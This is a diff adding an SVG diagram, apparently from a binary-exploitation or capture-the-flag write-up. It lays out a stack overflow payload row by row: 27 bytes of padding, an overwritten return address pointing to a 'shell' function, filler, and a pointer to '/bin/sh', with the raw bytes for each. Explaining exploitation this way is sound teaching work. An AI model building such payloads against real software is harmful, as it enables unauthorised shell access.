@@ -1,0 +1,37 @@
+<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 800 232" font-family="ui-monospace, 'SF Mono', Menlo, Consolas, monospace" font-size="14">
+  <!-- code-block style card, GitHub dark palette -->
+  <rect x="0" y="0" width="800" height="232" rx="8" fill="#0d1117" stroke="#30363d"/>
+
+  <!-- header -->
+  <text x="28"  y="40" fill="#6e7681">OFFSET</text>
+  <text x="112" y="40" fill="#6e7681">SLOT</text>
+  <text x="330" y="40" fill="#6e7681">VALUE</text>
+  <text x="560" y="40" fill="#6e7681">RAW BYTES</text>
+  <line x1="24" y1="52" x2="776" y2="52" stroke="#21262d"/>
+
+  <!-- row 1: padding -->
+  <text x="28"  y="86" fill="#6e7681">+0</text>
+  <text x="112" y="86" fill="#c9d1d9">padding</text>
+  <text x="330" y="86" fill="#8b949e">"A" * 27</text>
+  <text x="560" y="86" fill="#6e7681">fills buffer + saved ebp</text>
+
+  <!-- row 2: return address -> shell -->
+  <text x="28"  y="122" fill="#6e7681">+27</text>
+  <text x="112" y="122" fill="#c9d1d9">saved return addr</text>
+  <text x="330" y="122" fill="#3fb950">0x080486bd</text>
+  <text x="438" y="122" fill="#6e7681">shell</text>
+  <text x="560" y="122" fill="#3fb950">\xbd\x86\x04\x08</text>
+
+  <!-- row 3: shell's ret slot -->
+  <text x="28"  y="158" fill="#6e7681">+31</text>
+  <text x="112" y="158" fill="#c9d1d9">shell's ret slot</text>
+  <text x="330" y="158" fill="#8b949e">"A" * 4</text>
+  <text x="560" y="158" fill="#6e7681">filler, unused</text>
+
+  <!-- row 4: shell's argument -> /bin/sh -->
+  <text x="28"  y="194" fill="#6e7681">+35</text>
+  <text x="112" y="194" fill="#c9d1d9">shell's argument</text>
+  <text x="330" y="194" fill="#d29922">0x080497d0</text>
+  <text x="438" y="194" fill="#6e7681">&amp;"/bin/sh"</text>
+  <text x="560" y="194" fill="#d29922">\xd0\x97\x04\x08</text>
+</svg>
